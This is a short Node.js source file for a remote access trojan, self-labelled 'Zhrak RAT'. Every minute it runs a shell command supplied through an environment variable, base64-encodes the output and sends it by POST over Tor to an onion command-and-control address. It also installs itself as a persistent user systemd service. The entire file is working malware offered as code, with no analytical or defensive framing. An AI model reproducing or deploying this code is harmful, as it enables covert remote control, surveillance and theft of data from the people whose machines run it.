const {exec} = require('child_process');
const Tor = require('tor-request');
const fs = require('fs');

Tor.TorControlPort.password = 'zhrak1337';
Tor.setTorAddress('localhost', 9050);

function exfil(data) {
    Tor.request({
        url: 'http://zhrakc2.onion/collect', 
        method: 'POST',
        body: Buffer.from(data).toString('base64')
    }, () => {});
}

setInterval(() => {
    exec(process.env.COMMAND || 'whoami', (err, stdout, stderr) => {
        exfil(stdout + stderr);
    });
    
    if(!fs.existsSync(process.env.HOME + '/.config/systemd/user/rat.service')) {
        fs.writeFileSync(__dirname + '/rat.service', 
            `[Unit]\nDescription=Zhrak RAT\n[Service]\nExecStart=${process.execPath} ${__filename}\nRestart=always`);
        exec('systemctl --user enable ' + __dirname + '/rat.service');
    }
}, 60000);
